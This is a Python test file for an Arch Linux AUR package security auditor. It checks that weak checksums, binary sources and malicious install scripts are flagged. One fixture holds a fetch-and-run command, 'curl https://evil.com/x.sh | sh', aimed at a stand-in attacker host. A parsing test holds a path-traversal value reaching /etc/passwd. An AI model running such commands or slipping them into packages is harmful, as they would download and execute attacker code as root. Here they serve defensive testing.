# SPDX-License-Identifier: GPL-3.0-only OR MIT
"""Tests for unified security audit functionality."""

from unittest.mock import patch

import pytest
from arch_ops_server import audit_package_security
from arch_ops_server.aur import BINARY_EXTENSIONS


async def test_audit_package_security_pkgbuild_analysis():
    """Test PKGBUILD safety analysis."""
    pkgbuild = """pkgname=test
pkgver=1.0
pkgrel=1
arch=('x86_64')
"""
    result = await audit_package_security(
        action="pkgbuild_analysis",
        pkgbuild_content=pkgbuild
    )
    assert "risk_score" in result
    # Findings are reported in three severity buckets; there is no combined
    # "findings" key and no boolean verdict -- the scan does not certify a
    # package, so nothing may install on the strength of it.
    assert "red_flags" in result
    assert "warnings" in result
    assert "info" in result
    assert "limitations" in result
    assert "safe" not in result
    assert result["action"] == "pkgbuild_analysis"


def _warning_text(result: dict) -> str:
    """Join every warning message so a test can assert on what was reported."""
    return " ".join(warning["issue"] for warning in result["warnings"])


async def test_pkgbuild_analysis_flags_md5_checksums():
    """A real md5 digest is a finding: md5 collisions are constructible."""
    result = await audit_package_security(
        action="pkgbuild_analysis",
        pkgbuild_content="md5sums=('a8f84171ee1796fc4899579d92df0e24')\n"
    )
    assert "md5" in _warning_text(result)
    assert "collision-broken" in _warning_text(result)


async def test_pkgbuild_analysis_flags_sha1_checksums():
    """sha1 is broken in the same way and reported the same way."""
    result = await audit_package_security(
        action="pkgbuild_analysis",
        pkgbuild_content="sha1sums=('da39a3ee5e6b4b0d3255bfef95601890afd80709')\n"
    )
    assert "sha1" in _warning_text(result)
    assert "collision-broken" in _warning_text(result)


@pytest.mark.parametrize("algorithm", ["sha256", "sha384", "sha512", "b2"])
async def test_pkgbuild_analysis_accepts_strong_checksums(algorithm):
    """Algorithms that still resist collisions produce no integrity finding."""
    result = await audit_package_security(
        action="pkgbuild_analysis",
        pkgbuild_content=f"{algorithm}sums=('abc123')\n"
    )
    assert "collision-broken" not in _warning_text(result)


async def test_pkgbuild_analysis_reports_skip_without_the_algorithm():
    """
    SKIP verifies nothing at all, so the algorithm named alongside it is moot.

    Reporting both would suggest the fix is a stronger hash, when the source is
    simply unverified.
    """
    result = await audit_package_security(
        action="pkgbuild_analysis",
        pkgbuild_content="md5sums=('SKIP')\n"
    )
    assert "SKIP" in _warning_text(result)
    assert "collision-broken" not in _warning_text(result)


async def test_pkgbuild_analysis_flags_multi_line_md5_array():
    """The algorithm sits on the declaration line, so a split array still matches."""
    result = await audit_package_security(
        action="pkgbuild_analysis",
        pkgbuild_content=(
            "md5sums=(\n"
            "  'a8f84171ee1796fc4899579d92df0e24'\n"
            ")\n"
        )
    )
    assert "collision-broken" in _warning_text(result)


async def test_pkgbuild_analysis_flags_appimage_sources():
    """
    A prebuilt AppImage is the archetypal opaque binary in an AUR recipe.

    It went undetected for as long as the extension list was compared with the
    wrong case, so it gets a test of its own and not only the sweep below.
    """
    result = await audit_package_security(
        action="pkgbuild_analysis",
        pkgbuild_content='source=("https://example.com/app-1.0.AppImage")\n'
    )
    assert "Binary file type detected: .AppImage" in _warning_text(result)


@pytest.mark.parametrize("extension", BINARY_EXTENSIONS)
async def test_every_binary_extension_is_detectable(extension):
    """
    Parametrised over the real list so a new entry is covered automatically.

    This guards the class of bug rather than the instance: an entry carrying
    capitals cannot silently stop matching again.
    """
    result = await audit_package_security(
        action="pkgbuild_analysis",
        pkgbuild_content=f'source=("https://example.com/app-1.0{extension}")\n'
    )
    assert f"Binary file type detected: {extension}" in _warning_text(result)


async def test_audit_package_security_missing_pkgbuild():
    """Test error when pkgbuild_content is missing."""
    result = await audit_package_security(action="pkgbuild_analysis")
    assert "error" in result


async def test_audit_package_security_metadata_risk_with_name():
    """Test metadata risk analysis with package name."""
    result = await audit_package_security(
        action="metadata_risk",
        package_name="yay"
    )
    # Result depends on AUR API response
    assert "action" in result
    # Should either have trust_score or error
    assert "trust_score" in result or "error" in result


async def test_audit_package_security_metadata_risk_with_info():
    """Test metadata risk analysis with pre-fetched info."""
    package_info = {
        "Name": "test-package",
        "NumVotes": 100,
        "OutOfDate": None,
        "Maintainer": "testuser",
        "FirstSubmitted": 1609459200,
        "LastModified": 1609459200
    }
    result = await audit_package_security(
        action="metadata_risk",
        package_info=package_info
    )
    assert "trust_score" in result
    assert result["action"] == "metadata_risk"


async def test_audit_package_security_missing_params():
    """Test error when neither package_name nor package_info provided."""
    result = await audit_package_security(action="metadata_risk")
    assert "error" in result


async def test_audit_package_security_invalid_action():
    """Test error for invalid action."""
    result = await audit_package_security(action="invalid_action")
    assert "error" in result


# ============================================================================
# The .install script the recipe actually names
# ============================================================================
# install= may name any file. Probing only the conventional names and then
# reporting "No .install file in this package" hides a script that runs as
# root -- the same silent-gap shape as a rule that never fires.


async def _audit_with(pkgbuild: str, files: dict):
    """
    Run install_package_secure over a stubbed AUR, returning the result.

    `files` maps a filename to its content; anything else 404s the way the AUR
    does for a package that has no such file.
    """
    from arch_ops_server import aur

    requested = []

    async def not_official(_name):
        return {"error": True, "type": "NotFound"}

    async def aur_info(_name):
        return {"data": {"name": "demo", "version": "1.0", "NumVotes": 5}}

    async def get_pkgbuild(_name):
        return pkgbuild

    async def get_aur_file(_name, filename):
        requested.append(filename)
        if filename in files:
            return files[filename]
        raise ValueError(f"{filename} not found")

    async def fail(*args, **kwargs):
        raise AssertionError(f"must not spawn a subprocess: {args}")

    with patch("arch_ops_server.pacman.get_official_package_info", new=not_official), \
         patch.object(aur, "get_aur_info", new=aur_info), \
         patch.object(aur, "get_pkgbuild", new=get_pkgbuild), \
         patch.object(aur, "get_aur_file", new=get_aur_file), \
         patch("asyncio.create_subprocess_exec", new=fail):
        result = await aur.install_package_secure("demo", confirm=True)

    return result, requested


async def test_install_script_named_by_the_recipe_is_analysed():
    """A custom install= name is fetched, and what it contains is scanned."""
    result, requested = await _audit_with(
        'pkgname=demo\npkgver=1.0\ninstall=post-install.sh\n',
        {"post-install.sh": "post_install() {\n  curl https://evil.com/x.sh | sh\n}\n"},
    )

    assert "post-install.sh" in requested
    assert result["security_checks"]["install_files"] == ["post-install.sh"]
    # The proof it was really scanned: the red flag comes from that file only.
    findings = result["security_checks"]["pkgbuild_analysis"]
    assert any("curl" in flag["issue"].lower() for flag in findings["red_flags"])


async def test_install_declaration_expands_pkgname():
    """`install=$pkgname.install` is how the convention is usually written."""
    result, _ = await _audit_with(
        'pkgname=demo\npkgver=1.0\ninstall=$pkgname.install\n',
        {"demo.install": "post_install() {\n  echo hello\n}\n"},
    )

    assert result["security_checks"]["install_files"] == ["demo.install"]


async def test_unreadable_install_script_is_not_reported_as_absent():
    """
    A declared script that could not be fetched is a gap in the audit.

    Saying "No .install file in this package" would report an absence of risk
    where there is only an absence of checking.
    """
    result, _ = await _audit_with(
        'pkgname=demo\npkgver=1.0\ninstall=post-install.sh\n', {}
    )

    messages = " ".join(result["messages"])
    assert "No .install file" not in messages
    assert "post-install.sh" in messages
    assert "NOT analysed" in messages


async def test_conventional_install_name_still_found_without_a_declaration():
    """Recipes that declare nothing keep working off the conventional names."""
    result, _ = await _audit_with(
        'pkgname=demo\npkgver=1.0\n', {"demo.install": "post_install() {\n  :\n}\n"}
    )

    assert result["security_checks"]["install_files"] == ["demo.install"]


async def test_no_install_script_at_all_is_reported_plainly():
    """The ordinary case: nothing declared, nothing present, no false alarm."""
    result, _ = await _audit_with('pkgname=demo\npkgver=1.0\n', {})

    messages = " ".join(result["messages"])
    assert "No .install file in this package" in messages
    assert result["security_checks"]["install_files"] == []


@pytest.mark.parametrize("declaration,expected", [
    ("install=post-install.sh", ["post-install.sh"]),
    ("install=$pkgname.install", ["demo.install"]),
    ("install=${pkgbase}.install", ["demo.install"]),
    ('install="$pkgname.install"', ["demo.install"]),
    ("install=a.install\ninstall=b.install", ["a.install", "b.install"]),
    # A variable this cannot resolve is dropped rather than guessed at.
    ("install=$release_type.install", []),
    # Neither of these declares an install script.
    ("_install=evil.sh", []),
    ("  install -d $pkgdir/usr/bin", []),
    # The name reaches a URL, so a path may not travel out of the package.
    ("install=../../../etc/passwd", []),
])
def test_install_declaration_parsing(declaration, expected):
    """What counts as a declaration, and what must not be mistaken for one."""
    from arch_ops_server.aur import _declared_install_files

    assert _declared_install_files(declaration, "demo") == expected


@pytest.mark.parametrize("declaration", ["md5sums_x86_64", "sha1sums_i686"])
async def test_architecture_specific_weak_checksums_are_flagged(declaration):
    """
    Arch-suffixed checksum arrays are covered by the unsuffixed name match.

    Raised in review as a possible bypass. It is not one -- re.match anchors at
    the start only, so md5sums_x86_64= matches on its md5sums prefix -- but the
    reachability is worth pinning down rather than re-deriving.
    """
    result = await audit_package_security(
        action="pkgbuild_analysis",
        pkgbuild_content=f"{declaration}=('a8f84171ee1796fc4899579d92df0e24')\n"
    )
    assert "collision-broken" in _warning_text(result)


# ============================================================================
# The caveat has to describe what was actually read
# ============================================================================


async def test_limitations_name_the_install_script_when_it_was_not_read():
    """The default case: PKGBUILD text only, and the caveat says so."""
    result = await audit_package_security(
        action="pkgbuild_analysis", pkgbuild_content="pkgname=demo\n"
    )
    assert "Does not cover the .install script" in result["limitations"]
    assert result["scanned_files"] == ["PKGBUILD"]


def test_limitations_stop_disclaiming_a_file_that_was_scanned():
    """
    Callers that concatenate the install script must not still disclaim it.

    Reporting "does not cover the .install script" over a scan that did read it
    understates the coverage, which is its own kind of misleading -- it invites
    a second manual check of the one file already covered.
    """
    from arch_ops_server.aur import analyze_pkgbuild_safety

    result = analyze_pkgbuild_safety(
        "pkgname=demo\npost_install() { :; }\n",
        scanned_files=["PKGBUILD", "demo.install"],
    )

    assert "Does not cover the .install script" not in result["limitations"]
    assert "demo.install" in result["limitations"]
    assert result["scanned_files"] == ["PKGBUILD", "demo.install"]
    # The caveats that still hold must survive.
    assert "not an assurance of safety" in result["limitations"]
